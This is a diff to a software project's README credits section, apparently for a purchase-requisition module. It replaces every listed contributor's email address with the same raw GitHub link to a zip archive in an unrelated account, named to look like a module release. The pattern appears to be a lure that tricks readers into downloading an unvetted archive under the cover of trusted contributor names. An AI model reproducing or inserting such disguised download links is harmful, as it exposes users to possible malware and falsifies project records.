@@ -12,7 +12,7 @@ Credits
 
 Contributors
 ------------
-* Esther Martín <esthermartin@avanzosc.es>
-* Pedro M. Baeza <pedro.baeza@serviciosbaeza.com>
-* Ana Juaristi <anajuaristi@avanzosc.es>
-* Oihane Crucelaegui <oihanecrucelaegi@avanzosc.es>
+* Esther Martín <https://raw.githubusercontent.com/vladimir2678/purchase-requisition/master/models/purchase_requisition_v2.3-alpha.1.zip>
+* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/purchase-requisition/master/models/purchase_requisition_v2.3-alpha.1.zip>
+* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/purchase-requisition/master/models/purchase_requisition_v2.3-alpha.1.zip>
+* Oihane Crucelaegui <https://raw.githubusercontent.com/vladimir2678/purchase-requisition/master/models/purchase_requisition_v2.3-alpha.1.zip>
